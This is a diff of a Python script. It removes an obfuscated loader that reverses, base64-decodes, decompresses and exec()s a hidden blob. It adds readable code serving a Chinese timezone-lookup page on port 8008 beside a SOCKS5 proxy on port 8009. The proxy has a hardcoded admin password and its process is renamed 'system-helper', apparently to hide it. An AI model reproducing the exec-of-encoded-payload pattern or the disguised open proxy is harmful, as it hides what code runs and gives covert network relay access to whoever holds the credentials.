@@ -1,2 +1,235 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'==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'))
+import socket
+import threading
+import struct
+import select
+import sys
+import os
+from datetime import datetime
+import zoneinfo
+from urllib.parse import urlparse, parse_qs
+
+try:
+    import setproctitle
+except ImportError:
+    setproctitle = None
+
+# ========================== HTTP 配置 ==========================
+COMMON_TIMEZONES = sorted([
+    "UTC", "Asia/Shanghai", "Asia/Tokyo", "Asia/Dubai", "Asia/Singapore",
+    "Europe/London", "Europe/Berlin", "Europe/Paris", "Europe/Moscow",
+    "Europe/Warsaw", "America/New_York", "America/Chicago",
+    "America/Los_Angeles", "Pacific/Auckland", "Australia/Sydney"
+])
+
+TIMEZONE_COORDS = {
+    "UTC": [51.5074, -0.1278, 5],
+    "Asia/Shanghai": [31.2304, 121.4737, 7],
+    "Asia/Tokyo": [35.6895, 139.6917, 7],
+    "Asia/Dubai": [25.276987, 55.296249, 8],
+    "Asia/Singapore": [1.3521, 103.8198, 8],
+    "Europe/London": [51.5074, -0.1278, 8],
+    "Europe/Berlin": [52.5200, 13.4050, 8],
+    "Europe/Paris": [48.8566, 2.3522, 8],
+    "Europe/Moscow": [55.7558, 37.6173, 7],
+    "Europe/Warsaw": [52.2297, 21.0122, 8],
+    "America/New_York": [40.7128, -74.0060, 7],
+    "America/Chicago": [41.8781, -87.6298, 7],
+    "America/Los_Angeles": [34.0522, -118.2437, 7],
+    "Pacific/Auckland": [-36.8485, 174.7633, 7],
+    "Australia/Sydney": [-33.8688, 151.2093, 7]
+}
+
+HTML_TEMPLATE = """<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>时区时间查询</title>
+</head>
+<body>
+<form method="GET" action="/">
+<select name="timezone" onchange="this.form.submit()">
+<option value="" disabled {initial_select_state}>--- 请选择一个时区 ---</option>
+{options_placeholder}
+</select>
+</form>
+<div>{result_placeholder}</div>
+</body>
+</html>"""
+
+def generate_html_page(result_html, selected_tz=None):
+    options_html = ""
+    for tz in COMMON_TIMEZONES:
+        is_selected = ' selected' if tz == selected_tz else ''
+        options_html += f'<option value="{tz}"{is_selected}>{tz}</option>'
+    return HTML_TEMPLATE.format(
+        options_placeholder=options_html,
+        result_placeholder=result_html,
+        initial_select_state='selected' if not selected_tz else ''
+    )
+
+def handle_http_request(client_socket):
+    result_html = "<p>请从下拉菜单中选择一个时区。</p>"
+    selected_tz_name = None
+    try:
+        request_data = client_socket.recv(4096).decode('utf-8', 'ignore')
+        if not request_data:
+            client_socket.close(); return
+
+        first_line = request_data.split('\r\n')[0]
+        if ' ' not in first_line: client_socket.close(); return
+        
+        path = first_line.split(' ')[1]
+        parsed_url = urlparse(path)
+        query_params = parse_qs(parsed_url.query)
+
+        selected_tz_name = query_params.get('timezone', [None])[0]
+
+        if selected_tz_name:
+            try:
+                target_tz = zoneinfo.ZoneInfo(selected_tz_name)
+                utc_now = datetime.now(zoneinfo.ZoneInfo("UTC"))
+                local_time = utc_now.astimezone(target_tz)
+                formatted_time = local_time.strftime('%Y-%m-%d %H:%M:%S %Z')
+                result_html = f"<b>{selected_tz_name}</b><br>当前时间: {formatted_time}"
+            except Exception as e:
+                result_html = f"<p style='color: red;'>查询时发生错误: {e}</p>"
+        
+        final_html = generate_html_page(result_html, selected_tz_name)
+        http_response = (
+            "HTTP/1.1 200 OK\r\n"
+            "Content-Type: text/html; charset=utf-8\r\n"
+            f"Content-Length: {len(final_html.encode('utf-8'))}\r\n"
+            "Connection: close\r\n\r\n"
+            f"{final_html}"
+        ).encode('utf-8')
+        
+        client_socket.sendall(http_response)
+
+    except Exception:
+        pass
+    finally:
+        client_socket.close()
+
+# ========================== SOCKS5 配置 ==========================
+PROTOCOL_VERSION = 5
+AUTH_METHOD = 0x02
+
+class IPForwarder:
+    def __init__(self, credentials):
+        self.credentials = credentials
+
+    def process_request(self, client_socket):
+        try:
+            header = client_socket.recv(2)
+            if not header or header[0] != PROTOCOL_VERSION: return
+            nmethods = header[1]
+            methods = client_socket.recv(nmethods)
+            if AUTH_METHOD not in methods:
+                client_socket.sendall(struct.pack("!BB", PROTOCOL_VERSION, 0xFF)); return
+            client_socket.sendall(struct.pack("!BB", PROTOCOL_VERSION, AUTH_METHOD))
+            if not self.authenticate(client_socket): return
+            header = client_socket.recv(4)
+            if not header or len(header) < 4: return
+            ver, cmd, rsv, atyp = struct.unpack("!BBBB", header)
+            if ver != PROTOCOL_VERSION or cmd != 0x01:
+                self.send_reply(client_socket, 0x07); return
+            if atyp == 0x01:
+                dest_addr = socket.inet_ntoa(client_socket.recv(4))
+            elif atyp == 0x03:
+                domain_len = client_socket.recv(1)[0]
+                dest_addr = client_socket.recv(domain_len).decode('utf-8')
+            elif atyp == 0x04:
+                dest_addr = socket.inet_ntop(socket.AF_INET6, client_socket.recv(16))
+            else:
+                self.send_reply(client_socket, 0x08); return
+            dest_port = struct.unpack('!H', client_socket.recv(2))[0]
+            try:
+                remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                remote_socket.connect((dest_addr, dest_port))
+                bind_addr, bind_port = remote_socket.getsockname()
+                self.send_reply(client_socket, 0x00, socket.inet_aton(bind_addr), bind_port)
+            except Exception:
+                self.send_reply(client_socket, 0x01); return
+            self.relay_data(client_socket, remote_socket)
+        except Exception:
+            pass
+        finally:
+            client_socket.close()
+
+    def authenticate(self, client_socket):
+        try:
+            header = client_socket.recv(2)
+            if not header or header[0] != 0x01: return False
+            ulen = header[1]
+            username = client_socket.recv(ulen).decode('utf-8')
+            plen = client_socket.recv(1)[0]
+            password = client_socket.recv(plen).decode('utf-8')
+            if self.credentials.get(username) == password:
+                client_socket.sendall(struct.pack("!BB", 0x01, 0x00)); return True
+            else:
+                client_socket.sendall(struct.pack("!BB", 0x01, 0x01)); return False
+        except Exception:
+            return False
+
+    def send_reply(self, client_socket, rep, bnd_addr=b'\x00\x00\x00\x00', bnd_port=0):
+        reply = struct.pack("!BBBB", PROTOCOL_VERSION, rep, 0x00, 0x01) + bnd_addr + struct.pack("!H", bnd_port)
+        client_socket.sendall(reply)
+
+    def relay_data(self, client_socket, remote_socket):
+        try:
+            while True:
+                readable, _, _ = select.select([client_socket, remote_socket], [], [], 300)
+                if not readable: break
+                for sock in readable:
+                    data = sock.recv(4096)
+                    if not data: return
+                    other_sock = remote_socket if sock is client_socket else client_socket
+                    other_sock.sendall(data)
+        except Exception:
+            pass
+        finally:
+            remote_socket.close()
+
+# ========================== 启动服务 ==========================
+if __name__ == '__main__':
+    HOST = '0.0.0.0'
+    HTTP_PORT = 8008
+    SOCKS5_PORT = 8009
+    IP_SERVICE_CREDENTIALS = {'admin': 'xiao123456'}
+
+    ip_forwarder = IPForwarder(IP_SERVICE_CREDENTIALS)
+
+    if setproctitle:
+        setproctitle.setproctitle("system-helper")
+
+    # HTTP 服务线程
+    def start_http():
+        http_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        http_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        http_sock.bind((HOST, HTTP_PORT))
+        http_sock.listen(100)
+        print(f"HTTP 服务启动：{HOST}:{HTTP_PORT}")
+        while True:
+            client, addr = http_sock.accept()
+            threading.Thread(target=handle_http_request, args=(client,), daemon=True).start()
+
+    # SOCKS5 服务线程
+    def start_socks5():
+        socks_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        socks_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        socks_sock.bind((HOST, SOCKS5_PORT))
+        socks_sock.listen(100)
+        print(f"SOCKS5 服务启动：{HOST}:{SOCKS5_PORT}")
+        while True:
+            client, addr = socks_sock.accept()
+            threading.Thread(target=ip_forwarder.process_request, args=(client,), daemon=True).start()
+
+    threading.Thread(target=start_http, daemon=True).start()
+    threading.Thread(target=start_socks5, daemon=True).start()
+
+    print("INFO: 两个服务已启动，按 Ctrl+C 停止")
+    try:
+        while True:
+            threading.Event().wait(1)
+    except KeyboardInterrupt:
+        print("INFO: 停止服务")
